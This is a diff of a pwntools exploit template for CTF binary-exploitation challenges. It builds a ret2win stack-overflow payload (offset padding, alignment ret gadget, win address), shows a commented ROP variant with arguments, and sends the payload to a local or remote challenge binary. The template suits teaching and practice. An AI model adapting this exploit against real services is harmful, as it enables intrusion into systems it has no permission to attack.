@@ -1,30 +1,27 @@
 #!/usr/bin/env python3
 """
-Universal Pwntools Template for CTF Pwn Challenges.
+Pwntools template for binary exploitation challenges.
 Usage:
-    python3 solve.py               # Runs locally against ./vuln
-    python3 solve.py REMOTE        # Runs against remote server
-    python3 solve.py GDB           # Attaches GDB to local process
+    python3 solve.py               # Runs locally against target binary
+    python3 solve.py REMOTE        # Connects to remote challenge server
+    python3 solve.py GDB           # Spawns binary with GDB attached
 """
 
 from pwn import *
 
-# ==============================================================================
-# CONFIGURATION
-# ==============================================================================
+# Configuration
 exe = './vuln'
 host = '127.0.0.1'
 port = 1337
 
 elf = context.binary = ELF(exe, checksec=False)
-context.terminal = ['tmux', 'splitw', '-h'] # or ['x-terminal-emulator', '-e']
+context.terminal = ['tmux', 'splitw', '-h']
 context.log_level = 'info'
 
 def start():
     if args.REMOTE:
         return remote(host, port)
     elif args.GDB:
-        # Script commands to run in GDB on attach
         gdbscript = '''
         init-pwndbg
         break main
@@ -36,38 +33,29 @@ def start():
 
 io = start()
 
-# ==============================================================================
-# HELPER: FIND OFFSET USING CYCLIC PATTERN
-# ==============================================================================
-# In terminal:
-#   cyclic 100
-# Run program in GDB, input cyclic string, inspect crash address ($rsp or $eip):
-#   cyclic -l 0x61616161 (or 4 bytes string 'caaa')
-# Set offset below:
+# Offset calculation
+# Generate pattern: cyclic 100
+# Find offset: cyclic -l <fault_address>
 offset = 40
 
-# ==============================================================================
-# EXPLOIT PAYLOAD CONSTRUCTION
-# ==============================================================================
+# Exploit construction
 
-# Scenario A: ret2win (Function that gives flag exists, e.g., 'win' or 'print_flag')
+# Scenario 1: ret2win
 win_addr = elf.symbols['win']
-log.info(f"Target win address: {hex(win_addr)}")
+log.info(f"Target address: {hex(win_addr)}")
 
-# On 64-bit Ubuntu (GLIBC 2.27+), MOVAPS requires stack aligned to 16 bytes.
-# If exploit crashes inside system() or do_system(), insert a dummy 'ret' gadget!
+# In 64-bit binaries on GLIBC 2.27+, system() requires a 16-byte aligned stack.
+# Insert a single ret instruction before the call if the program crashes in system().
 ret_gadget = (elf.search(asm('ret'))).__next__()
 
-# 64-bit payload:
 payload = flat({
     offset: [
-        ret_gadget,   # Stack alignment fix (if needed for 64-bit)
-        win_addr      # Address of win function
+        ret_gadget,   # Stack alignment for 64-bit system calls
+        win_addr
     ]
 })
 
-# Scenario B: 64-bit function with arguments (e.g. win(0xdeadbeef, 0xcafebabe))
-# In x86_64: Args go in RDI, RSI, RDX, RCX, R8, R9
+# Scenario 2: Function with arguments in 64-bit (RDI, RSI, RDX)
 # rop = ROP(elf)
 # pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
 # payload = flat({
@@ -78,10 +66,6 @@ payload = flat({
 #     ]
 # })
 
-# ==============================================================================
-# SEND PAYLOAD & INTERACT
-# ==============================================================================
-io.sendlineafter(b':', payload) # Wait for prompt and send
-# io.sendline(payload)
-
+# Send payload
+io.sendlineafter(b':', payload)
 io.interactive()
